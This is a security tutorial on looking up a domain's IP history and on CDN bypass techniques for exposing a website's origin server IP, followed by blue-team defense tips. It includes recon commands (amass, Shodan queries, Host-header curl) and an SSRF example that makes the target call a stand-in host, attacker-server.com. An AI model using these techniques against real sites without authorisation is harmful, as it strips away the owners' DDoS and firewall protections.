# IP Address History

Tools that show the historical IP address records (A records) a domain has pointed to.

## ViewDNS IP History

Website: https://viewdns.info/iphistory/

### Lookup Example

Domain: [armourinfosec.com](https://armourinfosec.com)

```
IP Address History:
- 103.21.59.29 – First Seen: 2023-05-12, Last Seen: 2024-11-20
- 162.241.123.20 – First Seen: 2022-01-05, Last Seen: 2023-05-11
- 192.185.129.4 – First Seen: 2020-08-18, Last Seen: 2022-01-04
```

> Dates represent when ViewDNS first and last observed the domain resolving to each IP.

## Use Cases

- Investigating past hosting providers  
- Detecting domain hijacking or infrastructure changes  
- Attribution in security research  
- Recon in penetration testing and OSINT  

## Additional Tools for IP History

| Tool           | Purpose                             | URL                             |
| :------------- | :---------------------------------- | :------------------------------ |
| SecurityTrails | Domain/IP/DNS history               | https://securitytrails.com/     |
| DNSDumpster    | Passive DNS and subdomains          | https://dnsdumpster.com/        |
| ViewDNS        | Ownership and registration timeline | https://viewdns.info/iphistory/ |
| RiskIQ         | IP resolutions and asset history    | https://www.riskiq.com/         |

---
--- 

CDN Bypass – Techniques & Concepts
---



CDN (Content Delivery Network) is used to:

- Cache content close to users
- Mask the origin server's IP
- Provide security features (WAF, rate-limiting, DDoS protection)

CDN Bypass refers to techniques used to:

- Discover the origin server IP
- Interact directly with the backend server, bypassing CDN protections

## Common CDN Bypass Techniques
---
### 1. Find the Origin IP

Use recon tools to locate the real IP behind the CDN.

#### a. DNS History / Passive DNS

Check historical A records before CDN was used:
- [SecurityTrails](https://securitytrails.com/)
- [ViewDNS IP History](https://viewdns.info/iphistory/)
- [RiskIQ PassiveTotal](https://community.riskiq.com/)

#### b. Subdomain Enumeration
Some subdomains may not be behind the CDN:
```
amass enum -d target.com
```

#### c. Shodan / Censys Search
Search by SSL cert, favicon hash, or headers:
```
ssl.cert.subject.CN:"target.com"
http.favicon.hash:123456789
```
- [shodan.io](https://www.shodan.io/)
- [censys.io](https://search.censys.io/)

#### d. Email/Webmail Leaks
Check email headers (e.g., password reset) which might reveal origin IP.

#### e. Misconfigured DNS
Sometimes origin domain points directly to server IP (e.g., ftp.target.com).

#### f. SSL Certificate Transparency Logs
View issued certificates to discover hidden subdomains:
- [crt.sh](https://crt.sh/)
- [Certspotter](https://sslmate.com/certspotter/)

---
### 2. Test IP Candidates

Once you have potential origin IPs:
- Use `curl` or `nmap` with Host header
```
curl -H "Host: target.com" http://<origin_ip>
```
If it returns the real site -> origin IP found.

---
### 3. Check Firewall Misconfigurations

Misconfigured origin may accept direct traffic:
- `iptables` or `fail2ban` not properly restricting to CDN IPs
- Use tools like `wafw00f` to detect WAF presence/absence
```
wafw00f http://target.com
```

---
### 4. Leaked Files or Git Repos
Sometimes `.git`, `.env`, or server files are exposed via other subdomains that bypass CDN.

---
### 5. Reveal Origin IP via Application Vulnerabilities
Instead of finding the IP first, you can exploit certain vulnerabilities on the website itself (while it's still behind the CDN) to force the origin server to reveal its IP address. This is typically done by making the server initiate a connection to an external system that you control.

Key vulnerabilities for this technique include:
-   **SSRF (Server-Side Request Forgery):** This is the most common method. By exploiting an SSRF flaw, you can command the server to send a request to a URL you own. Your server's logs will then show the origin server's IP as the source of the request.
-   **Command Injection:** If you can execute commands on the server, you can use utilities like `curl`, `wget`, or `ping` to make it contact your external server.
-   **XXE (XML External Entity):** Similar to SSRF, XXE can be used to force the server to fetch an external resource, revealing its IP to you.

**Example (using an SSRF vulnerability):**
1. An attacker identifies an SSRF vulnerability in a feature on `target.com`.
2. They craft a request that forces the server to connect to their own machine (e.g., `attacker-server.com`).
```bash
# The attacker sends this request to the public website
curl "https://target.com/loadImage?url=http://attacker-server.com/reveal.txt"
```
3. The attacker checks the access logs on `attacker-server.com`. The IP address that requested `/reveal.txt` is the real IP of the origin server, successfully bypassing the CDN's protection.
---
## Defense Tips (For Blue Team)
---
- Restrict origin IP to only accept traffic from CDN IP ranges (e.g., Cloudflare IP list)
- Use firewall rules and allow-lists
- Monitor DNS records for leaks
- Regularly scan for exposed services and old records
---
---
